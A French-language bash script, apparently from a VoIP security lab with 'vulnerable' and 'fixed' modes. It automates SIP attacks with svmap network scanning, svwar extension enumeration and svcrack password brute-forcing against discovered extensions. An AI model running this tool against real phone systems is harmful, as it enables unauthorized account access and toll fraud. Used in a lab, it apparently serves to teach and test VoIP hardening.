#!/bin/bash

scan ()
{ 
	if [[ $# > "0" && $1 == "discret" ]]; then
		auto=true
	else 
		auto=false
	fi



	net=`ip route | cut -d " " -f 1 | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}"`
	
	if [ $auto == true ]; then
		 plageScan=$net
	
	elif [ $auto == false ]; then

		pasIP=true
		while [ $pasIP == true ]
		do
			echo ""
			echo -e "\tEntrez une plage réseau à analyser : "
			echo -e "\tExemple : 192.168.1.0/24"
			echo -e "\t\t192.168.1.0 (/24 par defaut)"
			echo -e "\tAppuyer sur Entrée pour utiliser votre réseau actuel => $net"
			echo ""

			read -p '[Authentification][Scan réseau]=>' plageScan
	
			if [ -z $plageScan ]; then
				plageScan=$net
				pasIP=false
	
			elif [[ "$plageScan" =~ ([0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{2} ]]; then
				pasIP=false
	
			elif [[ "$plageScan" =~ ([0-9]{1,3}\.){3}[0-9]{1,3} ]]; then
				plageScan=$plageScan"/24"
				pasIP=false
			
			else
				echo "Ceci n'est pas une adresse de réseau !"
				pasIP=true
			fi
		done
	fi
	echo "Scan : "$plageScan
		
	svmap $plageScan > /tmp/voiphack/svmap	
	cat /tmp/voiphack/svmap
	bind=`grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" /tmp/voiphack/svmap | cut -d '|' -f 2 | tr -d " "`	
	ip=`echo $bind | cut -d ":" -f 1`
	echo $ip > /tmp/voiphack/svmapip
}

war () {
	if [[ $# > "0" && $1 == "discret" ]]; then
		auto=true
	else 
		auto=false
	fi

	
	if [ $auto == true ]; then
		if [ ! -f "/tmp/voiphack/svmapip" ];then
			scan discret
		fi
		 	ipScan=`cat /tmp/voiphack/svmapip`
		
	
	elif [ $auto == false ]; then

		pasIP=true
		while [ $pasIP == true ]
		do
			echo ""
			echo -e "\tEntrez une ip cible à analyser : "
			echo -e "\tExemple : 192.168.1.1"
			echo -e "\tAppuyer sur Entrée pour lancer un scan automatique"
			echo -e "\t Ou entrez \"list\" pour voir les ip disponible"
			echo ""

			read -p '[Authentification][Scan extension]=>' ipScan

			if [[ "$ipScan" =~ ([0-9]{1,3}\.){3}[0-9]{1,3} ]]; then
				pasIP=false
				echo $ipScan > /tmp/voiphack/svmapip

			elif [ -z $ipScan ]; then
				echo "Procédure de détection automatique"
				if [ ! -f "/tmp/voiphack/svmap" ];then	
					scan discret
				fi
				ipScan=`cat /tmp/voiphack/svmapip`
				if [ -n $ipScan ]; then
					pasIP=false
					
				else
					echo "Pas d'ip détecter "
					pasIP=true
				fi
			
			elif [ $ipScan == "list" ]; then
				if [ ! -f "/tmp/voiphack/svmap" ];then
					scan discret
				else
					cat /tmp/voiphack/svmap
				fi

			else
				echo "Ceci n'est pas une adresse IP !"
			fi
		done
	fi
	echo "Scan : "$ipScan
	svwar -e100-999 -m invite $ipScan --force > /tmp/voiphack/svwar
	cat /tmp/voiphack/svwar
	grep "reqauth" /tmp/voiphack/svwar | cut -d '|' -f 2 | tr -d " " > /tmp/voiphack/numList
	
}

crack () {
	pasIP=true
	while [ $pasIP == true ]
	do
		echo ""
		echo -e "\tEntrez une ip cible à analyser : "
		echo -e "\tExemple : 192.168.1.1"
		echo -e "\tAppuyer sur Entrée pour lancer un scan automatique"
		echo -e "\t Ou entrez \"list\" pour voir les ip disponible"
		echo ""

		read -p '[Authentification][Crack]=>' ipScan

		if [[ "$ipScan" =~ ([0-9]{1,3}\.){3}[0-9]{1,3} ]]; then
			pasIP=false
			echo $ipScan > /tmp/voiphack/svmapip

		elif [[ $ipScan == "list" ]]; then
			if [ ! -f "/tmp/voiphack/svmap" ];then	
				scan discret
			else
				cat /tmp/voiphack/svmap
			fi
					
		elif [ -z $ipScan ]; then
			echo "Procédure de détection automatique"
			if [ ! -f "/tmp/voiphack/svmapip" ];then	
				scan discret
			fi
			ipScan=`cat /tmp/voiphack/svmapip`
			if [ -n $ipScan ]; then
				pasIP=false

				echo "----------------------------------"
				echo -e "IP cible => $ipScan"
				echo -e "---------------------------------- \n"
				pasIP=false
					
			else
				echo "Pas d'ip détectée "
				pasIP=true
			fi

			
		else
			echo "Ceci n'est pas une adresse IP !"
		fi
	
	done
	pasNum=true
	while [ $pasNum == true ]
	do
		echo ""
		echo -e "\tEntrez une extension cible à attaquer : "
		echo -e "\tExemple : 301"
		echo -e "\tAppuyer sur Entrée pour lancer un scan automatique"
		echo -e "\t Ou entrez \"list\" pour voir les extension disponible"
		echo ""

		read -p '[Authentification][Crack]=>' numScan

		if let $numScan 2>/dev/null; then
			pasNum=false
			nbNum=1
		
		elif [[ $numScan == "list" ]]; then
			if [ ! -f "/tmp/voiphack/svwar" ];then	
				war discret
			else
				cat /tmp/voiphack/svwar
			fi			
		elif [ -z $numScan ]; then
			if [ ! -f "/tmp/voiphack/svwar" ];then	
				war discret
			fi
			pasNum=false
			nbNum=`cat /tmp/voiphack/numList | wc -l`
		
		else
			echo "Ceci n'est pas un numero !"
		fi
	done
	if [ $nbNum -eq 1 ] ;then
		echo "un seul numéro"
		echo "Scan : "$ipScan
		echo "Scan : "$numScan
		if [ -f /var/voiphack/list ];then
			svcrack $ipScan -u $numScan -d /var/voiphack/list
		else	
			svcrack $ipScan -u $numScan
		fi
	elif [ $nbNum -eq 0 ];then
		echo "Pas de numéro trouvé"

	else
		echo "plusieurs numéro"
		
		
		i=1
		while [[ $i -le $nbNum ]]
		do
			numScan=`sed -n $i'p' /tmp/voiphack/numList`
			
			if [ -f /var/voiphack/list ];then
				svcrack $ipScan -u $numScan -d /var/voiphack/list
			else	
				svcrack $ipScan -u $numScan
			fi
			i=$(($i+1))
		done
		
	fi
}

rm -rf /tmp/voiphack
mkdir /tmp/voiphack


	
	

		echo ""
		echo -e "\t\t\t[Authentification]"
		echo -e "\t\t\t   [Choix mode]"
		echo -e "\t\t[1] Faillible"
		echo -e "\t\t[2] Corrigé"
		echo -e "\t\t[q] Quitter"
		echo ""
	
		read -p '[Authentification]=>' choix
	
		case $choix in
			1) /var/voiphack/conf/sysupdate.sh bad;;
			2) /var/voiphack/conf/sysupdate.sh correct;;
			q) exit;;
		esac
	
while [ true ]
do
	
		

	echo ""
	echo -e "\t\t[Authentification]"
	echo -e "\t[1] Scan réseau"
	echo -e "\t[2] Scan des extensions disponible"
	echo -e "\t[3] Attaque d'une extension"
	echo -e "\t[q] Quitter"
	echo ""

	read -p '[Authentification]=>' choix
	
	case $choix in
		1) scan;;
		2) war;;
		3) crack;;
		q) exit;;
	esac
done



